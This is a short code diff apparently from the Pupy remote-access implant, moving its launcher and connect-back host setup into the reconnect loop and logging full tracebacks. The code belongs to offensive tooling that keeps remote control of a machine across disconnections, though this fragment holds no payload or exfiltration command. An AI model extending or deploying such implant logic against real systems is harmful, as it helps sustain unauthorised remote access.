@@ -146,25 +146,24 @@ def main():
 		except ImportError:
 			logging.warning("ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL")
 
-	launcher=conf.launchers[LAUNCHER]()
-	try:
-		launcher.parse_args(LAUNCHER_ARGS)
-	except LauncherError as e:
-		launcher.arg_parser.print_usage()
-		exit(str(e))
-
-	if "pupy" not in sys.modules:
-		add_pseudo_pupy_module(launcher.get_host())
-	else:
-		pupy.get_connect_back_host=launcher.get_host
-
-	import pupy
-	pupy.infos={} #global dictionary to store informations persistent through a deconnection
-	pupy.infos['launcher']=LAUNCHER
-	pupy.infos['launcher_args']=LAUNCHER_ARGS
-		
 	attempt=0
 	while True:
+		launcher=conf.launchers[LAUNCHER]()
+		try:
+			launcher.parse_args(LAUNCHER_ARGS)
+		except LauncherError as e:
+			launcher.arg_parser.print_usage()
+			exit(str(e))
+
+		if "pupy" not in sys.modules:
+			add_pseudo_pupy_module(launcher.get_host())
+		else:
+			pupy.get_connect_back_host=launcher.get_host
+
+		import pupy
+		pupy.infos={} #global dictionary to store informations persistent through a deconnection
+		pupy.infos['launcher']=LAUNCHER
+		pupy.infos['launcher_args']=LAUNCHER_ARGS
 		try:
 			for stream in launcher.iterate():
 				try:
@@ -212,7 +211,7 @@ def main():
 			logging.error(e)
 			break
 		except Exception as e:
-			logging.error(e)
+			logging.error(traceback.format_exc())
 		finally:
 			time.sleep(get_next_wait(attempt))
 			attempt+=1
